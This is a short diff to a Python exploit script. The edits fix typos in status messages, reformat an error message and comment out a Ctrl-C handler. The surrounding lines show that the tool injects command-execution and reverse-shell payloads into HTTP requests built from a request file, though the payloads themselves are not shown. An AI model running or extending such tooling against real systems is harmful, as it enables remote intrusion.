@@ -284,7 +284,7 @@ def read_file(path: str) -> list[str]:
         req_file = open(path, 'r')
         print("[+] Using request file: ", path)
     except Exception as e:
-        print_red("[+] Error opening file: ", path)  # print_red
+        print_red(f"[+] Error opening file: {path}\n")  # print_red
         exit(1)
 
     lines = req_file.readlines()
@@ -490,7 +490,7 @@ def exploit():
                 except requests.exceptions.SSLError:
                     print_red("[+] SSL error. Use --http flag?")
                     exit(1)
-            print(f"[+] Senfing payload #{rs_index}")
+            print(f"[+] Sending reverse shell payload #{rs_index}... ")
         
         print()
         print_info("[+] Done\n")
@@ -506,7 +506,7 @@ def exploit():
         
         payloads_list = generate_payload_silent(cmd)
 
-        print(f"[+] Sending requests with payload executingl: {cmd}")
+        print(f"[+] Sending requests with payload executing: {cmd}")
         for num, payload in enumerate(payloads_list):
             (method, url, headers, data) = parse_request_and_insert_payload(req_lines=request, payload=payload, custom_marker=g_args.marker, http=g_args.http)
             req = Request(method=method, url=url, headers=headers, data=data)
@@ -576,7 +576,7 @@ def print_red(txt):
 
 if __name__ == '__main__':
 
-    signal.signal(signal.SIGINT, sig_handler)
+    # signal.signal(signal.SIGINT, sig_handler)
     print_banner()
     check_py_version()
     parse_args()
